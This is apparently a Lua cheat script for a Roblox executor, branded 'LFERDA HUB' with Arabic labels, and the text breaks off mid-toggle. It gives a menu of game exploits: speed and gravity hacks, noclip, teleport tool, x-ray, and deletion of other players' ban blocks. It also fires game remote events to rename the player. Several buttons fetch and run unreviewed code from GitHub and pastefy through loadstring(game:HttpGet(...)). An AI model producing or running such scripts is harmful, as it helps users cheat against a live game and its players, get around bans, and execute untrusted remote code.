shared.LoaderTitle = "جار تحميل سكربت LFERDA HUB";
shared.LoaderKeyFrames = {
    [1] = {
        1,
        20
    },
    [2] = {
        2,
        50
    },
    [3] = {
        3,
        80
    },
    [4] = {
        2,
        100
    }
};
local v2 = {
    LoaderData = {
        Name = shared.LoaderTitle or "A Loader",
        Colors = shared.LoaderColors or {
            Main = Color3.fromRGB(0, 0, 0),
            Topic = Color3.fromRGB(255, 0, 0),
            Title = Color3.fromRGB(255, 0, 0),
            LoaderBackground = Color3.fromRGB(255, 0, 0),
            LoaderSplash = Color3.fromRGB(0, 0, 0)
        }
    },
    Keyframes = shared.LoaderKeyFrames or {
        [1] = {
            1,
            10
        },
        [2] = {
            2,
            30
        },
        [3] = {
            3,
            60
        },
        [4] = {
            2,
            100
        }
    }
};
local v3 = {
    [1] = "",
    [2] = "",
    [3] = "",
    [4] = ""
};
function TweenObject(v178, v179, v180)
    game.TweenService:Create(v178, TweenInfo.new(v179, Enum.EasingStyle.Linear, Enum.EasingDirection.InOut), v180):Play();
end
function CreateObject(v181, v182)
    local v183 = Instance.new(v181);
    local v184;
    for v416, v417 in pairs(v182) do
        if (v416 ~= "Parent") then
            v183[v416] = v417;
        else
            v184 = v417;
        end
    end
    v183.Parent = v184;
    return v183;
end
local function v4(v186, v187)
    local v188 = Instance.new("UICorner");
    v188.CornerRadius = UDim.new(0, v186);
    v188.Parent = v187;
end
local v5 = CreateObject("ScreenGui", {
    Name = "Core",
    Parent = game.CoreGui
});
local v6 = CreateObject("Frame", {
    Name = "Main",
    Parent = v5,
    BackgroundColor3 = v2.LoaderData.Colors.Main,
    BorderSizePixel = 0,
    ClipsDescendants = true,
    Position = UDim2.new(0.5, 0, 0.5, 0),
    AnchorPoint = Vector2.new(0.5, 0.5),
    Size = UDim2.new(0, 0, 0, 0)
});
v4(12, v6);
local v7 = CreateObject("ImageLabel", {
    Name = "UserImage",
    Parent = v6,
    BackgroundTransparency = 1,
    Image = "rbxassetid://77996083279350",
    Position = UDim2.new(0, 15, 0, 10),
    Size = UDim2.new(0, 55, 0, 55)
});
v4(25, v7);
local v8 = CreateObject("TextLabel", {
    Name = "UserName",
    Parent = v6,
    BackgroundTransparency = 1,
    Text = "اهلا بك في السكربت | TO CLAN TOP",
    Position = UDim2.new(0, 75, 0, 10),
    Size = UDim2.new(0, 200, 0, 50),
    Font = Enum.Font.GothamBold,
    TextColor3 = v2.LoaderData.Colors.Title,
    TextSize = 14,
    TextXAlignment = Enum.TextXAlignment.Left
});
local v9 = CreateObject("TextLabel", {
    Name = "Top",
    TextTransparency = 1,
    Parent = v6,
    BackgroundColor3 = Color3.fromRGB(255, 255, 255),
    BackgroundTransparency = 1,
    Position = UDim2.new(0, 30, 0, 70),
    Size = UDim2.new(0, 301, 0, 20),
    Font = Enum.Font.Gotham,
    Text = "Loader",
    TextColor3 = v2.LoaderData.Colors.Topic,
    TextSize = 10,
    TextXAlignment = Enum.TextXAlignment.Left
});
local v10 = CreateObject("TextLabel", {
    Name = "Title",
    Parent = v6,
    TextTransparency = 1,
    BackgroundColor3 = Color3.fromRGB(255, 255, 255),
    BackgroundTransparency = 1,
    Position = UDim2.new(0, 30, 0, 90),
    Size = UDim2.new(0, 301, 0, 46),
    Font = Enum.Font.Gotham,
    RichText = true,
    Text = "<b>" .. v2.LoaderData.Name .. "</b>",
    TextColor3 = v2.LoaderData.Colors.Title,
    TextSize = 14,
    TextXAlignment = Enum.TextXAlignment.Left
});
local v11 = CreateObject("Frame", {
    Name = "BG",
    Parent = v6,
    AnchorPoint = Vector2.new(0.5, 0),
    BackgroundTransparency = 1,
    BackgroundColor3 = v2.LoaderData.Colors.LoaderBackground,
    BorderSizePixel = 0,
    Position = UDim2.new(0.5, 0, 0, 70),
    Size = UDim2.new(0.8500000238418579, 0, 0, 24)
});
v4(8, v11);
local v12 = CreateObject("Frame", {
    Name = "Progress",
    Parent = v11,
    BackgroundColor3 = v2.LoaderData.Colors.LoaderSplash,
    BackgroundTransparency = 1,
    BorderSizePixel = 0,
    Size = UDim2.new(0, 0, 0, 24)
});
v4(8, v12);
local v13 = CreateObject("TextLabel", {
    Name = "StepLabel",
    Parent = v6,
    BackgroundTransparency = 1,
    Position = UDim2.new(0.5, 0, 1, - 25),
    Size = UDim2.new(1, - 20, 0, 20),
    Font = Enum.Font.Gotham,
    Text = "",
    TextColor3 = v2.LoaderData.Colors.Topic,
    TextSize = 14,
    TextXAlignment = Enum.TextXAlignment.Center,
    AnchorPoint = Vector2.new(0.5, 0.5)
});
function UpdateStepText(v191)
    v13.Text = v3[v191] or "" ;
end
function UpdatePercentage(v193, v194)
    TweenObject(v12, 0.5, {
        Size = UDim2.new(v193 / 100, 0, 0, 24)
    });
    UpdateStepText(v194);
end
TweenObject(v6, 0.25, {
    Size = UDim2.new(0, 346, 0, 121)
});
wait();
TweenObject(v9, 0.5, {
    TextTransparency = 0
});
TweenObject(v10, 0.5, {
    TextTransparency = 0
});
TweenObject(v11, 0.5, {
    BackgroundTransparency = 0
});
TweenObject(v12, 0.5, {
    BackgroundTransparency = 0
});
for v195, v196 in pairs(v2.Keyframes) do
    wait(v196[1]);
    UpdatePercentage(v196[2], v195);
end
UpdatePercentage(100, 4);
TweenObject(v9, 0.5, {
    TextTransparency = 1
});
TweenObject(v10, 0.5, {
    TextTransparency = 1
});
TweenObject(v11, 0.5, {
    BackgroundTransparency = 1
});
TweenObject(v12, 0.5, {
    BackgroundTransparency = 1
});
wait(0.5);
TweenObject(v6, 0.25, {
    Size = UDim2.new(0, 0, 0, 0)
});
wait(0.25);
v5:Destroy();

  wait(0.27)
local TweenService = game:GetService("TweenService")
local Players = game:GetService("Players")
local Lighting = game:GetService("Lighting")
local player = Players.LocalPlayer
local gui = Instance.new("ScreenGui", player:WaitForChild("PlayerGui"))
gui.ResetOnSpawn = false
gui.Name = "FancyNotificationGui"

local blur = Instance.new("BlurEffect")
blur.Size = 0
blur.Parent = Lighting

local messages = {
    "سكربت LFERDA HUB",
    "LFERDA عمكم حارق دمكم",
    "سفاح الافضل",
    "شوي و يتفعل لازم ريسيت للأحتياط"
}

local function showNotification(text, imageId)
    local frame = Instance.new("Frame")
    frame.Size = UDim2.new(0.1, 0, 0.1, 0)
    frame.Position = UDim2.new(0.5, 0, 1.2, 0)
    frame.BackgroundColor3 = Color3.fromRGB(25, 25, 25)
    frame.BackgroundTransparency = 0.1
    frame.BorderSizePixel = 0
    frame.AnchorPoint = Vector2.new(0.5, 1)
    frame.Parent = gui
    frame.ClipsDescendants = true

    local uicorner = Instance.new("UICorner", frame)
    uicorner.CornerRadius = UDim.new(0, 12)

    local shadow = Instance.new("UIStroke", frame)
    shadow.Color = Color3.fromRGB(255, 255, 255)
    shadow.Thickness = 1
    shadow.Transparency = 0.7

    local img = Instance.new("ImageLabel", frame)
    img.Image = imageId
    img.Size = UDim2.new(0, 60, 0, 60)
    img.Position = UDim2.new(0, 10, 0.5, -30)
    img.BackgroundTransparency = 1

    local circle = Instance.new("UICorner", img)
    circle.CornerRadius = UDim.new(1, 0)

    local txt = Instance.new("TextLabel", frame)
    txt.Text = text
    txt.Size = UDim2.new(1, -80, 1, -20)
    txt.Position = UDim2.new(0, 80, 0, 10)
    txt.BackgroundTransparency = 1
    txt.TextColor3 = Color3.fromRGB(255, 220, 255)
    txt.TextStrokeTransparency = 0.5
    txt.TextWrapped = true
    txt.TextScaled = true
    txt.Font = Enum.Font.FredokaOne

    TweenService:Create(blur, TweenInfo.new(0.4, Enum.EasingStyle.Quad, Enum.EasingDirection.Out), {Size = 12}):Play()

    local tweenIn = TweenService:Create(frame, TweenInfo.new(0.4, Enum.EasingStyle.Back, Enum.EasingDirection.Out), {
        Size = UDim2.new(0.4, 0, 0.12, 0),
        Position = UDim2.new(0.5, 0, 0.85, 0)
    })
    tweenIn:Play()
    tweenIn.Completed:Wait()

    wait(0.28)

    local tweenOut = TweenService:Create(frame, TweenInfo.new(0.4, Enum.EasingStyle.Quad, Enum.EasingDirection.In), {
        Position = UDim2.new(0.5, 0, 1.3, 0),
        Size = UDim2.new(0.1, 0, 0.1, 0)
    })
    TweenService:Create(blur, TweenInfo.new(0.4), {Size = 0}):Play()
    tweenOut:Play()
    tweenOut.Completed:Wait()

    frame:Destroy()
end

coroutine.wrap(function()
    for _, msg in ipairs(messages) do
        showNotification(msg, "rbxassetid://115881843808544")
        wait(0.30)
    end
end)()

  wait(0.32)
  
local Sound = Instance.new("Sound", game:GetService("SoundService"));
Sound.SoundId = "rbxassetid://";
Sound:Play();

game.Players.LocalPlayer.Character.Humanoid.Health = 0
wait(0.1)
game.StarterGui:SetCore("SendNotification", {
    Title = "MT3ATI HUB";
    Text = "تم التفعيل بنجاح"; -- ARAB TEAM
    Duration = 5;
})
game:GetService("ReplicatedStorage").RE["1RPNam1eTex1t"]:FireServer("RolePlayName", "LFERDA Script | V0.9")

local args = {
    [1] = "PickingRPNameColor",
    [2] = Color3.fromRGB(255, 0, 0), -- Amarelo
}

game:GetService("ReplicatedStorage"):WaitForChild("RE"):WaitForChild("1RPNam1eColo1r"):FireServer(unpack(args))

local args = {
    [1] = "RolePlayBio",
    [2] ="LFERDA ON TOP"
}

game:GetService("ReplicatedStorage"):WaitForChild("RE"):WaitForChild("1RPNam1eTex1t"):FireServer(unpack(args))

local args = {
    [1] = "PickingRPBioColor",
    [2] = Color3.fromRGB(0, 0, 0), -- Blue
}

game:GetService("ReplicatedStorage"):WaitForChild("RE"):WaitForChild("1RPNam1eColo1r"):FireServer(unpack(args))
wait(0.5)
game.StarterGui:SetCore("SendNotification", {
    Title = "شكرا لاستعمالك السكربت";
    Text = "CLAN TO TOP"; -- ARAB TEAM
    Duration = 5;
})

local redzlib = loadstring(game:HttpGet("https://raw.githubusercontent.com/A-IDK313/Hub.Script313/refs/heads/main/Redzhubui.txt"))()

local Window = redzlib:MakeWindow({
  Title = "LFERDA HUB   |   V0.9",
  SubTitle = "Made By : MT3ATI",
  SaveFolder = "MT3ATI 1 Config"
})

Window:AddMinimizeButton({
    Button = { Image = "rbxassetid://77996083279350", BackgroundTransparency = 0 },
    Corner = { CornerRadius = UDim.new(35, 1) },
})

local Tab = Window:MakeTab({"المعلومات"})
local Section = Tab:AddSection({
	Name = "مرحبا بكم"
})

local Section = Tab:AddSection({
	Name = "اعضاء الكلان:"
})

local Section = Tab:AddSection({
	Name = "LFERDA"
})

local Section = Tab:AddSection({
	Name = "PAPLO"
})

local Section = Tab:AddSection({
	Name = "MT3ATI"
})

local Section = Tab:AddSection({
	Name = "AHMAD"
})

local Section = Tab:AddSection({
	Name = "ARTHUR"
})

local Section = Tab:AddSection({
	Name = "BLE"
})

local Section = Tab:AddSection({
	Name = "HASSAN"
})

local Tab = Window:MakeTab({"السيرفر"})

Tab:AddButton({
    Name = "سيرفر عشوائي",
    Description = "اضغط لدخول سيرفر عشوائي",
    Callback = function()
        local PlaceID = game.PlaceId
        local AllIDs = {}
        local foundAnything = ""
        local actualHour = os.date("!*t").hour
        local Deleted = false
        local File = pcall(function()
            AllIDs = game:GetService('HttpService'):JSONDecode(readfile("NotSameServers.json"))
        end)
        if not File then
            table.insert(AllIDs, actualHour)
            writefile("NotSameServers.json", game:GetService('HttpService'):JSONEncode(AllIDs))
        end
        function TPReturner()
            local Site;
            if foundAnything == "" then
                Site = game.HttpService:JSONDecode(game:HttpGet('https://games.roblox.com/v1/games/' .. PlaceID .. '/servers/Public?sortOrder=Asc&limit=100'))
            else
                Site = game.HttpService:JSONDecode(game:HttpGet('https://games.roblox.com/v1/games/' .. PlaceID .. '/servers/Public?sortOrder=Asc&limit=100&cursor=' .. foundAnything))
            end
            local ID = ""
            if Site.nextPageCursor and Site.nextPageCursor ~= "null" and Site.nextPageCursor ~= nil then
                foundAnything = Site.nextPageCursor
            end
            local num = 0;
            for i,v in pairs(Site.data) do
                local Possible = true
                ID = tostring(v.id)
                if tonumber(v.maxPlayers) > tonumber(v.playing) then
                    for _,Existing in pairs(AllIDs) do
                        if num ~= 0 then
                            if ID == tostring(Existing) then
                                Possible = false
                            end
                        else
                            if tonumber(actualHour) ~= tonumber(Existing) then
                                local delFile = pcall(function()
                                    delfile("NotSameServers.json")
                                    AllIDs = {}
                                    table.insert(AllIDs, actualHour)
                                end)
                            end
                        end
                        num = num + 1
                    end
                    if Possible == true then
                        table.insert(AllIDs, ID)
                        wait()
                        pcall(function()
                            writefile("NotSameServers.json", game:GetService('HttpService'):JSONEncode(AllIDs))
                            wait()
                            game:GetService("TeleportService"):TeleportToPlaceInstance(PlaceID, ID, game.Players.LocalPlayer)
                        end)
                        wait(4)
                    end
                end
            end
        end
        
        function Teleport()
            while wait() do
                pcall(function()
                    TPReturner()
                    if foundAnything ~= "" then
                        TPReturner()
                    end
                end)
            end
        end
        Teleport()
    end
})

Tab:AddButton({
    Name = "اعاده دخول السيرفر",
    Description = "اضغط لاعاده دخول السيرفر",
    Callback = function()
        local TeleportService = game:GetService("TeleportService")
        local Players = game:GetService("Players")
        local LocalPlayer = Players.LocalPlayer
        
        TeleportService:TeleportToPlaceInstance(game.PlaceId, game.JobId, LocalPlayer)
    end
})

Tab:AddButton({
    Name = "خروج من الماب",
    Description = "اضغط للخروج من الماب",
    Callback = function()
        game:Shutdown()
    end
})

local Section = Tab:AddSection({"اعدادات اخرى"})

Tab:AddButton({
    Name = "فتح ال Console",
    Description = "اضغط هنا لفتح ال Console",
    Callback = function()
        game.StarterGui:SetCore("DevConsoleVisible", true)
        wait()
    end
})

-- Global variable to track notification state
_G.NotificationsEnabled = true 

-- Function to show notification if enabled
local function ShowNotification(title, text, duration)
    if _G.NotificationsEnabled then
        game:GetService("StarterGui"):SetCore("SendNotification", {
            Title = title,
            Text = text,
            Duration = duration or 3
        })
    end
end

-- Handle player joining
game.Players.PlayerAdded:Connect(function(player)
    ShowNotification(
        "لقد دخل:",
        player.Name .. ""
    )
end)

-- Handle player leaving 
game.Players.PlayerRemoving:Connect(function(player)
    ShowNotification(
        "لعد خرج:",
        player.Name .. ""
    )
end)

local Toggle1 = Tab:AddToggle({
  Name = "اشعارات دخول و خروج اللاعبين",
  Description = "عندما تفعل هذه الاشعارات سيتم ارسال اشعارات دخول و خروج اللاعبين",
  Default = false 
})
Toggle1:Callback(function(Value)
 _G.NotificationsEnabled = Value
end)

local Tab = Window:MakeTab({"الاعب"})

local CoolSlider = Tab:AddSlider({
    Name = "سرعة اللاعب",
    Min = 0,
    Max = 1000,
    Default = 10,
    Color = Color3.fromRGB(255, 255, 255),
    Increment = 1,
    Flag = "Speed Slider",
    ValueName = "Speed",
    Callback = function(Value)
        game.Players.LocalPlayer.Character.Humanoid.WalkSpeed = Value
    end,
})

local CoolSlider = Tab:AddSlider({
    Name = "قوة القفز",
    Min = 0,
    Max = 1000,
    Default = 11,
    Color = Color3.fromRGB(255, 255, 255),
    Increment = 1,
    Flag = "Jump Slider",
    ValueName = "Jump",
    Callback = function(Value)
        game.Players.LocalPlayer.Character.Humanoid.JumpHeight = Value
    end,
})

local CoolSlider = Tab:AddSlider({
    Name = "جاذبية اللاعب",
    Min = 0,
    Max = 1000,
    Default = 54,
    Color = Color3.fromRGB(255, 255, 255),
    Increment = 1,
    Flag = "Gravity Slider",
    ValueName = "Gravity",
    Callback = function(Value)
        game.Players.LocalPlayer.PlayerGui.Gravity = Value
    end,
})





Tab:AddSlider({
    Name = "زياده ال Fps",
    Description = "زياده ال Fps اقصى حد",
    Min = 144,
    Max = 1000,
    Increase = 1,
    Default = 1000,
    Callback = function(Value)
        setfpscap(Value)
    end
})

local Toggle3 = Tab:AddToggle({
    Name = "اضغط لتشغيل زياده ال Fps",
    Description = "تشغيل او ايقاف زياده ال Fps",
    Default = true,
    Callback = function(state)
        if state then
            setfpscap(10000000)
        else
            setfpscap(144)
        end
    end
})





Tab:AddTextBox({
  Name = "FOV الشاشه",
  Description = "هنا تكتب رقم مدى حد بعد الشاشه", 
  PlaceholderText = "ادخل الرقم هنا",
  Callback = function(Value)
    local FovNumber = value
local Camera = workspace.CurrentCamera
Camera.FieldOfView = FovNumber  
  end
})

local InfiniteJumpEnabled = false

game:GetService("UserInputService").JumpRequest:Connect(function()
    if InfiniteJumpEnabled then
        game.Players.LocalPlayer.Character:FindFirstChildOfClass('Humanoid'):ChangeState("Jumping")
    end
end)

local Toggle1 = Tab:AddToggle({
    Name = "انفنتي نط",
    Description = "اضغط لتشغيل انفنتي نط",
    Default = false,
    Callback = function(state)
        InfiniteJumpEnabled = state
    end
})

local Toggle = Tab:AddToggle({
  Name = "اختراق الجدران",
  Default = false,
  Callback = function(Value)
    if Value == true then
	-- Function to enable noclip for a player
local function enableNoclip(player)
    local character = player.Character
    if character then
        for _, part in pairs(character:GetDescendants()) do
            if part:IsA("BasePart") then
                part.CanCollide = false
            end
        end
    end
end

-- Function to disable noclip for a player
local function disableNoclip(player)
    local character = player.Character
    if character then
        for _, part in pairs(character:GetDescendants()) do
            if part:IsA("BasePart") then
                part.CanCollide = true
            end
        end
    end
end

-- Replace "PlayerName" with the name of the player you want to enable noclip for
local player = game.Players.LocalPlayer

-- Check if the player exists
if player then
    enableNoclip(player)
end
else
-- Function to enable noclip for a player
local function enableNoclip(player)
    local character = player.Character
    if character then
        for _, part in pairs(character:GetDescendants()) do
            if part:IsA("BasePart") then
                part.CanCollide = false
            end
        end
    end
end

-- Function to disable noclip for a player
local function disableNoclip(player)
    local character = player.Character
    if character then
        for _, part in pairs(character:GetDescendants()) do
            if part:IsA("BasePart") then
                part.CanCollide = true
            end
        end
    end
end

-- Replace "PlayerName" with the name of the player you want to enable noclip for
local player = game.Players.LocalPlayer

-- Check if the player exists
if player then
    disableNoclip(player)
end
end
  end
})

local Button = Tab:AddButton({
  Name = "ازالة الاق",
  Callback = function()
    local ToDisable = {
	Textures = false,
	VisualEffects = true,
	Parts = true,
	Particles = true,
	Sky = true
}

local ToEnable = {
	FullBright = false
}

local Stuff = {}

for _, v in next, game:GetDescendants() do
	if ToDisable.Parts then
		if v:IsA("Part") or v:IsA("Union") or v:IsA("BasePart") then
			v.Material = Enum.Material.SmoothPlastic
			table.insert(Stuff, 1, v)
		end
	end
	
	if ToDisable.Particles then
		if v:IsA("ParticleEmitter") or v:IsA("Smoke") or v:IsA("Explosion") or v:IsA("Sparkles") or v:IsA("Fire") then
			v.Enabled = false
			table.insert(Stuff, 1, v)
		end
	end
	
	if ToDisable.VisualEffects then
		if v:IsA("BloomEffect") or v:IsA("BlurEffect") or v:IsA("DepthOfFieldEffect") or v:IsA("SunRaysEffect") then
			v.Enabled = false
			table.insert(Stuff, 1, v)
		end
	end
	
	if ToDisable.Textures then
		if v:IsA("Decal") or v:IsA("Texture") then
			v.Texture = ""
			table.insert(Stuff, 1, v)
		end
	end
	
	if ToDisable.Sky then
		if v:IsA("Sky") then
			v.Parent = nil
			table.insert(Stuff, 1, v)
		end
	end
end
  end
})

Tab:AddButton({
    Name = "ازالة الاق 2",
    Description = "",
    Callback = function()
        local Terrain = workspace.Terrain
        local Lighting = game:GetService("Lighting")
        Terrain.WaterWaveSize = 0
        Terrain.WaterWaveSpeed = 0
        Terrain.WaterReflectance = 0
        Terrain.WaterTransparency = 0
        
        Lighting.GlobalShadows = false
        Lighting.FogEnd = 9e9
        Lighting.Brightness = 0
        
        for _, child in pairs(workspace:GetDescendants()) do
            if child:IsA("BasePart") and child.Name ~= "Terrain" then
                child.Material = Enum.Material.Plastic
                child.Reflectance = 0
            elseif child:IsA("Decal") or child:IsA("Texture") then
                child:Destroy()
            elseif child:IsA("ParticleEmitter") or child:IsA("Fire") or child:IsA("Smoke") then
                child.Enabled = false
            elseif child:IsA("Explosion") then
                child.Visible = false
            end
        end
    end
})

local Toggle1 = Tab:AddToggle({
    Name = "اظهار ال Fps و ال Ping",
    Description = "اضغط لاظهار ال Fps و ال Ping",
    Default = false,
    Callback = function(state)
        if state then
            local Ping = Instance.new("ScreenGui")
            Ping.Name = "Ping"
            Ping.Parent = game.Players.LocalPlayer:WaitForChild("PlayerGui")
            Ping.ZIndexBehavior = Enum.ZIndexBehavior.Sibling
            Ping.ResetOnSpawn = false

            local Pingtext = Instance.new("TextLabel")
            Pingtext.Name = "Pingtext"
            Pingtext.Parent = Ping
            Pingtext.BackgroundTransparency = 1

            local initialPingPositionPC = UDim2.new(1, -230, 0, 0)
            local initialFPSPositionPC = UDim2.new(1, -120, 0, 0)

            local initialPingPositionMobile = UDim2.new(1, -230, 1, -353)
            local initialFPSPositionMobile = UDim2.new(1, -120, 1, -353)

            local initialPingPosition = initialPingPositionPC
            local initialFPSPosition = initialFPSPositionPC

            Pingtext.Position = initialPingPosition
            Pingtext.Size = UDim2.new(0, 120, 0, 25)
            Pingtext.Font = Enum.Font.SourceSans
            Pingtext.Text = "Ping: "
            Pingtext.TextColor3 = Color3.fromRGB(255, 255, 255)
            Pingtext.TextStrokeTransparency = 0.5
            Pingtext.TextStrokeColor3 = Color3.fromRGB(0, 0, 0)
            Pingtext.TextScaled = true
            Pingtext.TextSize = 14.000
            Pingtext.TextWrapped = true

            local RunService = game:GetService("RunService")
            local UserInputService = game:GetService("UserInputService")

            local lastPing = -1
            local function updatePing()
                while true do
                    wait(0.1)
                    local ping = game:GetService("Stats").Network.ServerStatsItem["Data Ping"]:GetValue()
                    local roundedPing = math.floor(ping + 0.5)
                    if roundedPing ~= lastPing then
                        Pingtext.Text = "Ping: " .. roundedPing .. " (40%CV)"
                        if roundedPing > 250 then
                            Pingtext.TextColor3 = Color3.fromRGB(255, 0, 0)
                        else
                            Pingtext.TextColor3 = Color3.fromRGB(255, 255, 255)
                        end
                        lastPing = roundedPing
                    end
                end
            end

            spawn(updatePing)

            local TextLabel = Instance.new("TextLabel")
            TextLabel.Name = "FPSLabel"
            TextLabel.Parent = Ping
            TextLabel.BackgroundTransparency = 1

            TextLabel.Position = initialFPSPosition
            TextLabel.Size = UDim2.new(0, 45, 0, 25)
            TextLabel.Font = Enum.Font.SourceSans
            TextLabel.Text = "FPS: "
            TextLabel.TextColor3 = Color3.fromRGB(255, 255, 255)
            TextLabel.TextStrokeTransparency = 0.5
            TextLabel.TextStrokeColor3 = Color3.fromRGB(0, 0, 0)
            TextLabel.TextScaled = true
            TextLabel.TextSize = 18.000
            TextLabel.TextWrapped = true

            local function FormatFPS(fps)
                return "FPS: " .. math.floor(fps + 0.5)
            end

            local fpsSamples = {}
            local sampleDuration = 0.1
            local lastFPS = -1

            RunService.RenderStepped:Connect(function()
                table.insert(fpsSamples, tick())
                if #fpsSamples > 60 then
                    table.remove(fpsSamples, 1)
                end
            end)

            local function updateFPS()
                while true do
                    wait(sampleDuration)
                    local now = tick()
                    local count = 0
                    local totalTime = 0

                    for i = 1, #fpsSamples - 1 do
                        if fpsSamples[i + 1] then
                            totalTime = totalTime + (fpsSamples[i + 1] - fpsSamples[i])
                            count = count + 1
                        end
                    end

                    local fps = count / totalTime
                    if fps ~= lastFPS then
                        TextLabel.Text = FormatFPS(fps)

                        if fps < 30 then
                            TextLabel.TextColor3 = Color3.fromRGB(255, 0, 0)
                        else
                            TextLabel.TextColor3 = Color3.fromRGB(255, 255, 255)
                        end

                        lastFPS = fps
                    end
                end
            end

            spawn(updateFPS)

            local function updatePositions(isMobile)
                if isMobile then
                    initialPingPosition = initialPingPositionMobile
                    initialFPSPosition = initialFPSPositionMobile
                else
                    initialPingPosition = initialPingPositionPC
                    initialFPSPosition = initialFPSPositionPC
                end
            end

            UserInputService.InputChanged:Connect(function()
                local isMobile = UserInputService.TouchEnabled
                updatePositions(isMobile)
                Pingtext.Position = initialPingPosition
                TextLabel.Position = initialFPSPosition
            end)
        else
            local playerGui = game.Players.LocalPlayer:FindFirstChild("PlayerGui")
            if playerGui then
                local pingGui = playerGui:FindFirstChild("Ping")
                if pingGui then
                    pingGui:Destroy()
                end
            end
        end
    end
})

Tab:AddButton({ 	Name  = "الريست", 	Callback = function()

game.StarterGui:SetCore("SendNotification", {
    Title = "تم التشغيل";
    Text = "ملاحظه: في اوقات يمكن تعلق ل شوي و اوقات تعلق لازم تطلع و تدخل"; -- ARAB TEAM
    Duration = 5;
})

game.Players.LocalPlayer.Character.Humanoid.Health = 0

end })

Tab:AddButton({ 	Name  = "اداه التنقل", 	Callback = function()

game.StarterGui:SetCore("SendNotification", {
    Title = "Stefan Hz";
    Text = "تم استلام اداه التنقل"; -- ARAB TEAM
    Duration = 5;
})

    local player = game.Players.LocalPlayer
    local mouse = player:GetMouse()

    local function createTeleportTool()
        local tool = Instance.new("Tool")
        tool.RequiresHandle = false
        tool.Name = " تنقل || Stefan Hz"

        tool.Activated:Connect(function()
            local hitPos = mouse.Hit.p + Vector3.new(0, 2.5, 0)
            local pos = CFrame.new(hitPos)
            player.Character.HumanoidRootPart.CFrame = pos
        end)

        tool.Parent = player.Backpack
    end

    -- Cria a ferramenta inicialmente
    createTeleportTool()

    -- Adiciona a ferramenta novamente quando o personagem é reaparecido
    player.CharacterAdded:Connect(function()
        wait(0.1) -- Espera um curto período de tempo para garantir que o inventário seja carregado
        createTeleportTool()
    end)

end })

local Toggle1 = Tab:AddToggle({
  Name = "Xray",
  Description = "رؤيه اي شيء خلف الجدار",
  Default = false 
})
Toggle1:Callback(function(Value)
 xrayen = Value
for _, part in ipairs(workspace:GetDescendants()) do
  if part:IsA("BasePart") and not part.Parent:FindFirstChildOfClass("Humanoid") and part.Parent ~= game.Players.LocalPlayer.Character then
 part.LocalTransparencyModifier = xrayen and 0.6 or 0
  end
end
end)

Tab:AddButton({ 	Name  = "اخذ كنبه", 	Callback = function()
local args={[1]="PickingTools",[2]="Couch"};game:GetService("ReplicatedStorage").RE:FindFirstChild("1Too1l"):InvokeServer(unpack(args))
end })

Tab:AddButton({ 	Name  = "تفرك", 	Callback = function()
loadstring(game:HttpGet("https://pastefy.app/YZoglOyJ/raw"))()
end })

Tab:AddButton({ 	Name  = "مسجل اغاني", 	Callback = function()
_G.boomboxb = game:GetObjects('rbxassetid://740618400')[1]
_G.boomboxb.Parent = game:GetService'Players'.LocalPlayer.Backpack
loadstring(_G.boomboxb.Client.Source)() 
loadstring(_G.boomboxb.Server.Source)()
end })

local Tab = Window:MakeTab({"البيت"})

Tab:AddButton({
    Name = "ازالة الحظر",
    Description = "اضغط هنا لازالة الحظر",
    Callback = function()
        local successCount = 0
        local failCount = 0
        for i = 1, 37 do
            local bannedBlockName = "BannedBlock" .. i
            local bannedBlock = Workspace:FindFirstChild(bannedBlockName, true)
            if bannedBlock then
                local success, _ = pcall(function()
                    bannedBlock:Destroy()
                end)
                if success then
                    successCount = successCount + 1
                else
                    failCount = failCount + 1
                end
            end
        end
        for _, house in pairs(Workspace:GetDescendants()) do
            if house.Name:match("BannedBlock") then
                local success, _ = pcall(function()
                    house:Destroy()
                end)
                if success then
                    successCount = successCount + 1
                else
                    failCount = failCount + 1
                end
            end
        end
        if successCount > 0 then
        end
    end
})

Tab:AddButton({ 	Name  = "فتح و غلق الكراج", 	Callback = function()
local args = {
						[1] = "GarageDoor"
					}
					game:GetService("ReplicatedStorage"):WaitForChild("RE"):WaitForChild("1Player1sHous1e"):FireServer(unpack(args))
end })

Tab:AddButton({ 	Name  = "غلق و فتح الشباك", 	Callback = function()
local args = {
						[1] = "Curtains"
					}
					game:GetService("ReplicatedStorage"):WaitForChild("RE"):WaitForChild("1Player1sHous1e"):FireServer(unpack(args))
end })

Tab:AddButton({ 	Name  = "حذف البيت", 	Callback = function()
local args = {
    [1] = "PlayerSellHouse"
}

game:GetService("ReplicatedStorage"):WaitForChild("RE"):WaitForChild("1Player1sHous1eChoic1e"):FireServer(unpack(args))

end })

Tab:AddButton({ 	Name  = "فتح و قفل الباب", 	Callback = function()
local args = {
    [1] = "LockDoors"
}

game:GetService("ReplicatedStorage"):WaitForChild("RE"):WaitForChild("1Player1sHous1e"):FireServer(unpack(args))

end })

Tab:AddButton({ 	Name  = "تغير الوان بيتك", 	Callback = function()
local colors = {
      Color3.fromRGB(255, 0, 0),     
      Color3.fromRGB(255, 127, 0),   
      Color3.fromRGB(255, 255, 0),  
      Color3.fromRGB(0, 255, 0),   
      Color3.fromRGB(0, 0, 255),     
      Color3.fromRGB(75, 0, 130),    
      Color3.fromRGB(148, 0, 211)    
    }

    local remote = game:GetService("ReplicatedStorage"):WaitForChild("RE"):WaitForChild("1Player1sHous1e")

   
    while true do
      for _, color in ipairs(colors) do
        local args = {
          [1] = "ColorPickHouse",
          [2] = color
        }
        remote:FireServer(unpack(args))
        wait(0.5)
      end
    end
end })

local Tab = Window:MakeTab({"المضادات"})

local Toggle1 = Tab:AddToggle({
  Name = "مضاد الجلوس",
  Description = "اضغط الزر لتفعيل مضاد الجلوس",
  Default = false 
})
Toggle1:Callback(function(Value)
 local seats = {}
for _, seat in next, workspace:GetDescendants() do
	if seat:IsA("Seat") then
		seats[seat] = true
	end
end

workspace.DescendantAdded:connect(function(seat)
	if seat:IsA("Seat") then
		seats[seat] = true
		seat.Disabled = not enabled
	end
end)

workspace.DescendantRemoving:connect(function(seat)
	if seat:IsA("Seat") then
		seats[seat] = nil
	end
end)

setEnabled = function(newEnabled)
	if newEnabled == enabled then
		return
	end
	enabled = newEnabled
	for seat, _ in next, seats do
		seat.Disabled = not enabled
	end
end

---

setEnabled(false)
end)

local Toggle1 = Tab:AddToggle({
  Name = "مضاد الفلينق",
  Description = "اضغط لتفعيل مضاد الفلينق",
  Default = false 
})
Toggle1:Callback(function(Value) 
loadstring(game:HttpGet("https://raw.githubusercontent.com/NotAtomz/Atom-Scripts/refs/heads/main/anti%20fling"))()
end)

local Toggle2 = Tab:AddToggle({
    Name = "مضاد الخروج",
    Description = "اضغط لتشغيل مضاد الخروج",
